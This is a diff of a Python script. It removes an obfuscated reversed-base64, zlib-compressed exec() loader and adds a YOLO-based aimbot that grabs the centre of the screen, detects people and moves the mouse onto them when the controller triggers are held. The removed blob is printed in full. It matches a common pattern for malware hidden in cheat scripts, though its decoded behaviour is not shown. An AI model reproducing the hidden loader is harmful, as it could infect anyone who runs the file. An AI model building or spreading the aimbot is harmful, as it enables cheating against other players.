@@ -1,2 +1,81 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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'))
+from ultralytics import YOLO
+import bettercam
+import numpy as np
+import ctypes
+import torch
+import pygame
+import os
+
+os.system("cls")
+
+print("\033[43;97mLOADED -- V 1.0.1, Downgrade to terminal for less cpu usage \033[0m|")
+
+pygame.init()
+pygame.joystick.init()
+axis = pygame.joystick.Joystick(0)
+axis.init()
+
+mouse_event = ctypes.windll.user32.mouse_event
+
+CAPTURE_SIZE = 187
+FULL_CENTER_X = 960
+FULL_CENTER_Y = 540
+REL_CENTER_X = CAPTURE_SIZE
+REL_CENTER_Y = CAPTURE_SIZE
+VERTICAL_AIM_FACTOR = 0.25
+
+REGION = (
+    FULL_CENTER_X - REL_CENTER_X,
+    FULL_CENTER_Y - REL_CENTER_Y,
+    FULL_CENTER_X + REL_CENTER_X,
+    FULL_CENTER_Y + REL_CENTER_Y,
+)
+
+CAMERA = bettercam.create(
+    output_idx=0,
+    output_color="BGR",
+    region=REGION
+)
+
+
+def main():
+    print("\033[30m")
+    model = YOLO(r"c:/v/best.engine")
+    while True:
+        frame = CAMERA.grab()
+        if frame is None or frame.size == 0:
+            continue
+
+        img = np.ascontiguousarray(frame)
+        with torch.inference_mode():
+         results = model(
+            img,
+            classes=[0],
+            conf=0.3,
+            device=0,
+            verbose=False,
+            half=True,
+        )
+
+        if not results or not len(results[0].boxes):
+            continue
+
+        boxes = results[0].boxes.xyxy
+        if torch.is_tensor(boxes):
+            boxes = boxes.cpu().numpy()
+
+        x1, y1, x2, y2 = boxes[0]
+        cx = (x1 + x2) / 2
+        h = y2 - y1
+        cy = y1 + h * VERTICAL_AIM_FACTOR
+
+        dx = int(cx - REL_CENTER_X)
+        dy = int(cy - REL_CENTER_Y)
+
+        pygame.event.pump()
+        if axis.get_axis(4) > 0.0 or axis.get_axis(5) >0.0:
+            mouse_event(0x0001, (dx * 3), (dy * 3))
+main()
+
+
+
